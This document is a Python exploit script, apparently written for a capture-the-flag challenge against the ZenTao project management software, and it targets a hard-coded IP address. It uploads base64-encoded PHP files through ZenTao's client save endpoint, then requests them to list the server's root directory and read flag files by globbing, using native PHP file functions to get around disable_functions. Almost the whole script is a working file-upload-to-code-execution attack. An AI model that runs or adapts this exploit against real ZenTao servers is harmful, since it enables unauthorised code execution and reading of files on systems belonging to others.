#!/usr/bin/env python3
"""
禅道漏洞利用 - 使用 PHP 原生文件操作函数绕过 disable_functions
"""

import requests
import base64

requests.packages.urllib3.disable_warnings()

def exploit_with_php_natives():
    """使用 PHP 原生函数绕过 disable_functions"""
    base_url = "http://47.113.178.182:32829"

    print("""
╔═══════════════════════════════════════════════════════════════╗
║      禅道漏洞 - 使用 PHP 原生函数获取 Flag                   ║
╚═══════════════════════════════════════════════════════════════╝
    """)

    # Payload 1: 使用 scandir() 列出根目录
    payload1_src = "<?php var_dump(scandir('/')); ?>"
    payload1_b64 = base64.b64encode(payload1_src.encode()).decode()

    # Payload 2: 直接读取 /flag
    payload2_src = "<?php echo file_get_contents('/flag'); ?>"
    payload2_b64 = base64.b64encode(payload2_src.encode()).decode()

    # Payload 3: 终极组合 - 查找并读取所有包含 flag 的文件
    payload3_src = """<?php
$files = glob("/*flag*");
foreach($files as $f){
    echo "Found: " . $f . "<br>";
    echo "Content: " . file_get_contents($f) . "<br><hr>";
}
?>"""
    payload3_b64 = base64.b64encode(payload3_src.encode()).decode()

    payloads = [
        ("scandir.php", payload1_b64, "扫描根目录"),
        ("readflag.php", payload2_b64, "读取 /flag"),
        ("findall.php", payload3_b64, "查找并读取所有 flag 文件"),
    ]

    print("[*] 准备上传 3 个 Payload\n")

    for filename, payload_b64, description in payloads:
        print("=" * 70)
        print(f"测试: {description} ({filename})")
        print("=" * 70)

        # 上传
        upload_url = f"{base_url}/zentao/index.php?m=client&f=save&t=txt&fileName={filename}"

        try:
            resp = requests.post(upload_url, data=payload_b64, timeout=10)
            print(f"[*] 上传状态: {resp.status_code}")

            # 访问
            file_url = f"{base_url}/zentao/data/client/1/{filename}"
            print(f"[*] 访问: {file_url}")

            resp = requests.get(file_url, timeout=10)
            print(f"[*] 响应状态: {resp.status_code}")
            print(f"[*] 响应长度: {len(resp.content)} bytes")

            if resp.text.strip():
                print("\n✓ 成功获取输出!")
                print("-" * 70)
                print(resp.text)
                print("-" * 70)

                # 检查是否找到 flag
                if 'flag{' in resp.text.lower() or 'ctf{' in resp.text.lower():
                    print("\n" + "=" * 70)
                    print("🚩🚩🚩 找到 Flag! 🚩🚩🚩")
                    print("=" * 70)
                    return resp.text

            else:
                print("✗ 无输出\n")

        except Exception as e:
            print(f"✗ 错误: {e}\n")

    return None


def main():
    result = exploit_with_php_natives()

    if result:
        print("\n" + "=" * 70)
        print("任务完成! 最终结果:")
        print("=" * 70)
        print(result)
        print("=" * 70)
    else:
        print("\n[-] 未能获取 Flag")
        print("[*] 可能需要:")
        print("    1. 检查文件是否真的被上传")
        print("    2. 尝试其他文件路径")
        print("    3. 查看是否有 open_basedir 限制")


if __name__ == "__main__":
    main()
